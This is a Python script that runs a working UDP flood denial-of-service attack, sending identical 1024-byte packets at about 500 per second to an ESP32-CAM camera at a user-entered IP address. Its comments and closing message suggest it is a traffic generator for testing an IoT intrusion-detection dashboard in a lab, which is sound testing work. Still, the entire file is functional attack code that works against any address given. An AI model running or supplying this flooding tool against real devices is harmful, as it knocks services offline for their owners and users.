import socket
import random
import time
import sys

def udp_flood(target_ip, target_port=80, duration=30):
    print(f"[DDoS] UDP Flood against {target_ip}:{target_port}")
    print(f"[INFO] Duration: {duration}s | Rate: ~500 pps | Packet size: 1024 bytes")
    print("[INFO] This will freeze the ESP32-CAM video stream!")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # CIC-IoT 2023 DDoS UDP Flood signature:
    # - Large uniform payload (900-1200 bytes) 
    # - Very high packet rate (200-500 pps)
    # - Near-zero payload variance (identical garbage data)
    payload = b'X' * 1024  # Identical payload = zero variance = DDoS signature

    end_time = time.time() + duration
    packets_sent = 0

    try:
        while time.time() < end_time:
            sock.sendto(payload, (target_ip, target_port))
            packets_sent += 1
            if packets_sent % 200 == 0:
                elapsed = time.time() - (end_time - duration)
                print(f"   -> Sent {packets_sent} packets | {packets_sent/elapsed:.0f} pps")
            time.sleep(0.002)  # ~500 pps - well above the 30 pps gate
    except KeyboardInterrupt:
        print("\n[STOPPED] Attack stopped manually.")

    sock.close()
    print(f"[DONE] Sent {packets_sent} UDP packets. Check the dashboard for DDoS alert!")

if __name__ == "__main__":
    ip = input("Enter Target ESP32-CAM IP (Default: 192.168.24.167): ").strip() or "192.168.24.167"
    dur = input("Enter Duration in seconds (Default: 30): ").strip()
    dur = int(dur) if dur.isdigit() else 30
    udp_flood(ip, 80, dur)
